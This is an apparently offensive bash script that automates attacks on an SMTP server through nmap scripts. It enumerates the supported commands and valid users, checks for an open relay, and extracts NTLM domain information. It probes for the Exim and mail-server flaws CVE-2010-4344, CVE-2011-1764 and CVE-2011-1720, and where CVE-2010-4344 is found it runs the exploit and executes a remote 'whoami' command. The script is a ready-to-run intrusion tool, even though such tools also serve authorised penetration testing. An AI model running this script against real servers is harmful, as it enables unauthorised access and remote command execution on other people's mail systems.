#!/bin/bash
RHOST=${1:-_gateway}
RPORT=${2:-25}

# LIST of all scripts ls /usr/share/nmap/scripts/ | grep 'smtp'
can_enum_users() {
	for e in "${SMTP_COMMANDS[@]}"
	do
		if [[ ${e^^} == "VRFY" ]] || [[ ${e^^} == "EXPN" ]]
		then
			return 0
		fi
	done
	return 1
}

get_smtp_domain() {
        for e in "${SMTP_COMMANDS[@]}"
        do
                if [[ ${e,,} =~ ".com" ]]
                then
                        echo $e
			return 0
                fi
        done
        return 1
}

# -- MAIN --
# Enumerate all valid SMTP commands on this server 
>&2 echo "[INFO] Testing SMTP server ${RHOST}:${RPORT}"
SMTP_COMMANDS=( $(nmap -T4 -Pn -p${RPORT} --script=smtp-commands ${RHOST} | grep 'smtp-commands:' | sed 's/|_//; s/smtp-commands: /"/; s/, /" "/g; s/\(.*\)"/\1 /') )
DOMAIN=$(get_smtp_domain)

# Execute smtp-enum-users if possible
if { can_enum_users; } 2>/dev/null
then
	nmap -T4 -Pn -p${RPORT} --script=smtp-enum-users ${RHOST}
else
	>&2 echo "[FAIL] Cannot enumerate smtp users. VRFY and EXPN unsupported"
fi

# Determine if server is an open relay
if nmap -T4 -Pn -p${RPORT} --script=smtp-open-relay ${RHOST} 2>/dev/null | grep -q 'open relay'
then
	>&2 echo "[SUCCESS] SMTP is an open-relay"
else
	>&2 echo "[FAIL] SMTP is not an open-relay"
fi

# Enumerate information from remote SMTP services with NTLM authentication enabled.
if nmap -T4 -Pn -p${RPORT} --script=smtp-ntlm-info --script-args smtp-ntlm-info.domain=${DOMAIN} ${RHOST} | grep -q 'smtp-ntlm-info'
then
	>&2 echo "[SUCCESS] SMTP ntlm info discovered"
        nmap -T4 -Pn -p${RPORT} --script=smtp-ntlm-info --script-args smtp-ntlm-info.domain=${DOMAIN} ${RHOST}
else
	>&2 echo "[FAIL] no SMTP ntlm info found"
fi

# Execute cve2010-4344
if nmap -Pn -T4 --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -p${RPORT} ${RHOST} | grep -q 'State: VULNERABLE'
then
	>&2 echo "[SUCCESS] SMTP server is vulnerable to cve2010-4344"
	nmap -Pn -T4 --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -p${RPORT} ${RHOST}
	nmap -Pn -T4 --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='whoami'" -p${RPORT} ${RHOST}
else
	>&2 echo "[FAIL] SMTP not vulnerable to cve2010-4344"
fi

# Execute cve2011-1764
if nmap -Pn -T4 --script=smtp-vuln-cve2011-1764  -p${RPORT} ${RHOST} | grep -q 'State: VULNERABLE'
then
	>&2 echo "[SUCCESS] SMTP vulnerable to cve2011-1764"
	nmap -Pn -T4 --script=smtp-vuln-cve2011-1764 -p${RPORT} ${RHOST}
else
	>&2 echo "[FAIL] SMTP not vulnerable to cve2011-1764"
fi

# Execute cve2011-1720
if nmap -Pn -T4 --script=smtp-vuln-cve2011-1720 --script-args="smtp.domain=${DOMAIN}" -p${RPORT} ${RHOST} | grep -q 'State: VULNERABLE'
then
	>&2 echo "[SUCCESS] SMTP vulnerable to cve2011-1720"
	nmap -Pn -T4 --script=smtp-vuln-cve2011-1720 --script-args="smtp.domain=${DOMAIN}" -p${RPORT} ${RHOST}
else
	>&2 echo "[FAIL] SMTP not vulnerable to cve2011-1720"
fi
